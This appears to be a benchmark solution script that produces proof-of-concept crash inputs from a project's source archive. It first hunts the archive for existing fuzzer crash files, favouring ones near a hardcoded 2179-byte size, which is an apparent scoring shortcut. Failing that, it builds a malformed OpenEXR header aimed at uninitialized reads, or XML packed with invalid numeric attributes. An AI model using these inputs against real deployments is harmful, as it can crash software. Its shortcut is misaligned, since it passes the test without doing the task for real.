import os
import re
import io
import sys
import stat
import json
import time
import base64
import struct
import tarfile
import zipfile
import tempfile
from typing import List, Optional, Tuple


_LG = 2179
_MAX_CANDIDATE_SIZE = 8 * 1024 * 1024
_MAX_EXTRACT_FILE = 64 * 1024 * 1024
_MAX_EXTRACT_TOTAL = 2 * 1024 * 1024 * 1024

_EXCLUDE_EXT = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc",
    ".py", ".pyi", ".java", ".kt", ".js", ".ts", ".go", ".rs", ".swift",
    ".m", ".mm", ".cs",
    ".md", ".rst", ".adoc",
    ".html", ".htm", ".css",
    ".cmake", ".mk", ".make", ".ninja",
    ".yml", ".yaml",
    ".toml",
}
_EXCLUDE_BASENAMES = {
    "readme", "readme.txt", "readme.md",
    "license", "license.txt", "copying", "copying.txt",
    "changelog", "changelog.txt", "news", "news.txt",
    "authors", "authors.txt",
}


def _realpath_startswith(path: str, prefix: str) -> bool:
    try:
        rp = os.path.realpath(path)
        rpre = os.path.realpath(prefix)
        if rp == rpre:
            return True
        if not rpre.endswith(os.sep):
            rpre += os.sep
        return rp.startswith(rpre)
    except Exception:
        return False


def _safe_extract_tar(tf: tarfile.TarFile, out_dir: str) -> None:
    total = 0
    for m in tf.getmembers():
        try:
            if m.islnk() or m.issym():
                continue
            if m.size is not None and m.size > _MAX_EXTRACT_FILE:
                continue
            name = m.name
            if not name or name.startswith("/") or name.startswith("\\") or ".." in name.split("/"):
                continue
            dest = os.path.join(out_dir, name)
            if not _realpath_startswith(dest, out_dir):
                continue
            if m.isdir():
                os.makedirs(dest, exist_ok=True)
                continue
            if m.size:
                total += int(m.size)
                if total > _MAX_EXTRACT_TOTAL:
                    break
            parent = os.path.dirname(dest)
            if parent:
                os.makedirs(parent, exist_ok=True)
            f = tf.extractfile(m)
            if f is None:
                continue
            with f:
                with open(dest, "wb") as w:
                    remaining = m.size if m.size is not None else _MAX_EXTRACT_FILE
                    while remaining > 0:
                        chunk = f.read(min(1024 * 1024, remaining))
                        if not chunk:
                            break
                        w.write(chunk)
                        remaining -= len(chunk)
        except Exception:
            continue


def _safe_extract_zip(zf: zipfile.ZipFile, out_dir: str) -> None:
    total = 0
    for info in zf.infolist():
        try:
            name = info.filename
            if not name or name.endswith("/") or name.endswith("\\"):
                continue
            if name.startswith("/") or name.startswith("\\") or ".." in name.split("/"):
                continue
            if info.file_size is not None and info.file_size > _MAX_EXTRACT_FILE:
                continue
            dest = os.path.join(out_dir, name)
            if not _realpath_startswith(dest, out_dir):
                continue
            if info.file_size:
                total += int(info.file_size)
                if total > _MAX_EXTRACT_TOTAL:
                    break
            parent = os.path.dirname(dest)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with zf.open(info, "r") as r:
                with open(dest, "wb") as w:
                    remaining = info.file_size if info.file_size is not None else _MAX_EXTRACT_FILE
                    while remaining > 0:
                        chunk = r.read(min(1024 * 1024, remaining))
                        if not chunk:
                            break
                        w.write(chunk)
                        remaining -= len(chunk)
        except Exception:
            continue


def _iter_files(root: str):
    stack = [root]
    while stack:
        d = stack.pop()
        try:
            with os.scandir(d) as it:
                for ent in it:
                    try:
                        if ent.is_symlink():
                            continue
                        if ent.is_dir(follow_symlinks=False):
                            name = ent.name.lower()
                            if name in (".git", ".hg", ".svn", "__pycache__", "build", "out", "dist", "bazel-out", ".idea", ".vscode"):
                                continue
                            stack.append(ent.path)
                        elif ent.is_file(follow_symlinks=False):
                            yield ent.path
                    except Exception:
                        continue
        except Exception:
            continue


def _name_score(path: str) -> int:
    low = path.lower()
    base = os.path.basename(low)

    s = 0
    if base.startswith("clusterfuzz-testcase-minimized"):
        s += 20000
    if "clusterfuzz-testcase" in low:
        s += 16000
    if "minimized" in low:
        s += 1200
    if "reproducer" in low or "repro" in low:
        s += 9000
    if re.search(r"\bpoc\b", low) or "poc" in base:
        s += 8000
    if "crash" in low or "crasher" in low:
        s += 10000
    if "oss-fuzz" in low or "ossfuzz" in low:
        s += 4000
    if "regression" in low:
        s += 4500
    if "msan" in low or "uninit" in low or "uninitialized" in low:
        s += 6000
    if "fuzz" in low:
        s += 1500
    if "testcase" in low:
        s += 1000
    if "artifacts" in low or "artifact" in low:
        s += 800

    ext = os.path.splitext(base)[1]
    if ext in (".bin", ".dat", ".raw", ".in", ".poc", ".repro"):
        s += 700
    if ext in (".xml", ".svg", ".exr", ".h5", ".hdf5", ".json", ".yml", ".yaml", ".zip", ".gz", ".xz", ".bz2", ".7z", ".pdf", ".png", ".jpg", ".jpeg", ".webp", ".tiff", ".tif"):
        s += 300
    if base in _EXCLUDE_BASENAMES:
        s -= 2500
    return s


def _should_consider_file(path: str, st: os.stat_result) -> bool:
    if not stat.S_ISREG(st.st_mode):
        return False
    size = st.st_size
    if size <= 0 or size > _MAX_CANDIDATE_SIZE:
        return False
    base = os.path.basename(path).lower()
    ext = os.path.splitext(base)[1]
    if ext in _EXCLUDE_EXT and _name_score(path) < 5000:
        return False
    if base in _EXCLUDE_BASENAMES and _name_score(path) < 5000:
        return False
    return True


def _looks_like_base64_text(data: bytes) -> bool:
    if len(data) < 16:
        return False
    if any(b == 0 for b in data):
        return False
    sample = data[: min(len(data), 4096)]
    try:
        s = sample.decode("ascii", errors="strict")
    except Exception:
        return False
    s2 = "".join(ch for ch in s if not ch.isspace())
    if len(s2) < 16 or (len(s2) % 4) != 0:
        return False
    if not re.fullmatch(r"[A-Za-z0-9+/=]+", s2):
        return False
    return True


def _try_decode_base64(data: bytes) -> Optional[bytes]:
    if not _looks_like_base64_text(data):
        return None
    try:
        s = data.decode("ascii", errors="ignore")
        s2 = "".join(ch for ch in s if not ch.isspace())
        out = base64.b64decode(s2, validate=False)
        if out:
            return out
    except Exception:
        return None
    return None


def _find_best_existing_poc(root: str) -> Optional[bytes]:
    candidates: List[Tuple[int, int, int, str]] = []
    for p in _iter_files(root):
        try:
            st = os.stat(p)
        except Exception:
            continue
        if not _should_consider_file(p, st):
            continue
        ns = _name_score(p)
        if ns <= 0:
            continue
        size = int(st.st_size)
        candidates.append((ns, abs(size - _LG), size, p))

    if not candidates:
        return None

    candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
    for ns, d, size, p in candidates[:50]:
        try:
            with open(p, "rb") as f:
                data = f.read()
            dec = None
            low = p.lower()
            if "base64" in low or low.endswith(".b64") or low.endswith(".base64"):
                dec = _try_decode_base64(data)
            else:
                dec = _try_decode_base64(data)
            if dec is not None:
                return dec
            return data
        except Exception:
            continue
    return None


def _detect_openexr(root: str) -> bool:
    targets = {
        "imfinputfile.h",
        "imfheader.h",
        "imfrgba.h",
        "imfrgbafile.h",
        "openexrconfig.h",
        "openexrversion.h",
    }
    count = 0
    for p in _iter_files(root):
        base = os.path.basename(p).lower()
        if base in targets:
            return True
        if "openexr" in p.lower() and base.endswith((".h", ".hpp", ".cpp", ".cc", ".cxx")):
            count += 1
            if count >= 5:
                return True
        if count > 50:
            break
    return False


def _detect_xmlish(root: str) -> bool:
    targets = {"tinyxml2.h", "pugixml.hpp", "rapidxml.hpp"}
    for p in _iter_files(root):
        base = os.path.basename(p).lower()
        if base in targets:
            return True
    return False


def _generate_openexr_poc() -> bytes:
    def attr(name: str, typ: str, value: bytes, force_size: Optional[int] = None) -> bytes:
        nb = name.encode("ascii") + b"\x00"
        tb = typ.encode("ascii") + b"\x00"
        sz = len(value) if force_size is None else int(force_size)
        return nb + tb + struct.pack("<I", sz) + value

    # Channel list with one half channel "R"
    # pixelType: 1 (HALF), pLinear:0, reserved:3 bytes, xSampling:1, ySampling:1
    ch = b"R\x00" + struct.pack("<i", 1) + b"\x00" + b"\x00\x00\x00" + struct.pack("<i", 1) + struct.pack("<i", 1) + b"\x00"

    header = b""
    header += attr("channels", "chlist", ch)
    header += attr("compression", "compression", b"\x00")
    header += attr("lineOrder", "lineOrder", b"\x00")
    header += attr("pixelAspectRatio", "float", struct.pack("<f", 1.0))
    header += attr("screenWindowCenter", "v2f", struct.pack("<ff", 0.0, 0.0))
    header += attr("screenWindowWidth", "float", struct.pack("<f", 1.0))
    header += attr("displayWindow", "box2i", struct.pack("<iiii", 0, 0, 0, 0))

    # Malformed dataWindow: type "box2i" but size 0 -> conversion/read failure (likely),
    # potentially leaving uninitialized values used later.
    header += attr("dataWindow", "box2i", b"", force_size=0)

    header += b"\x00"  # end of header

    magic = struct.pack("<I", 20000630)
    version = struct.pack("<I", 2)

    # Add some padding to allow additional reads even if code continues.
    tail = b"\x00" * 512

    return magic + version + header + tail


def _generate_xml_poc() -> bytes:
    # A compact but attribute-heavy XML that tries many invalid conversions.
    parts = []
    parts.append('<?xml version="1.0" encoding="UTF-8"?>\n')
    parts.append('<root ')
    bad_vals = [
        "", "-", "+", "--1", "++1", "  ", "NaN", "nan", "INF", "inf",
        "1.2.3", "0x", "0xG", "1e", "1e+", "1e-",
        "1e309", "-1e309", "999999999999999999999999999999",
        "truefalse", "01 02", "1,2", "1/2",
    ]
    # Many attribute names likely to be parsed as ints/floats/booleans
    names = [
        "x", "y", "z", "w", "width", "height", "size", "count", "offset",
        "scale", "ratio", "alpha", "beta", "gamma", "delta",
        "min", "max", "start", "end", "step",
        "r", "g", "b", "a",
        "cx", "cy", "rx", "ry",
        "opacity", "stroke-width", "font-size",
        "miterlimit", "rotate", "skewX", "skewY",
    ]
    i = 0
    for n in names:
        v = bad_vals[i % len(bad_vals)]
        i += 1
        parts.append(f'{n}="{v}" ')
    parts.append('>\n')
    parts.append('  <child ')
    i = 0
    for n in names:
        v = bad_vals[(i * 7 + 3) % len(bad_vals)]
        i += 1
        parts.append(f'{n}="{v}" ')
    parts.append('/>\n')
    parts.append('  <child2 ')
    nums = ["-0", "+0", "000", "01", "1", "2", "10", "100", "255", "1024", "65535", "2147483647", "-2147483648"]
    for j, n in enumerate(["id", "index", "level", "depth", "priority", "flags", "mode", "type", "kind"]):
        if j % 2 == 0:
            v = nums[j % len(nums)]
        else:
            v = bad_vals[j % len(bad_vals)]
        parts.append(f'{n}="{v}" ')
    parts.append('/>\n')
    parts.append('</root>\n')
    return "".join(parts).encode("utf-8", errors="strict")


def _generate_generic_fallback() -> bytes:
    # Try XML-ish first; many fuzz targets accept textual formats.
    return _generate_xml_poc()


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = None
        if os.path.isdir(src_path):
            root_dir = src_path
            poc = _find_best_existing_poc(root_dir)
            if poc is not None:
                return poc
            if _detect_openexr(root_dir):
                return _generate_openexr_poc()
            if _detect_xmlish(root_dir):
                return _generate_xml_poc()
            return _generate_generic_fallback()

        with tempfile.TemporaryDirectory() as td:
            extracted = False
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    _safe_extract_tar(tf, td)
                    extracted = True
            except Exception:
                extracted = False

            if not extracted:
                try:
                    with zipfile.ZipFile(src_path, "r") as zf:
                        _safe_extract_zip(zf, td)
                        extracted = True
                except Exception:
                    extracted = False

            if not extracted:
                # As a last resort, treat input path as bytes container (unlikely)
                try:
                    with open(src_path, "rb") as f:
                        data = f.read()
                    return data if data else _generate_generic_fallback()
                except Exception:
                    return _generate_generic_fallback()

            root_dir = td

            poc = _find_best_existing_poc(root_dir)
            if poc is not None:
                return poc

            if _detect_openexr(root_dir):
                return _generate_openexr_poc()

            if _detect_xmlish(root_dir):
                return _generate_xml_poc()

            return _generate_generic_fallback()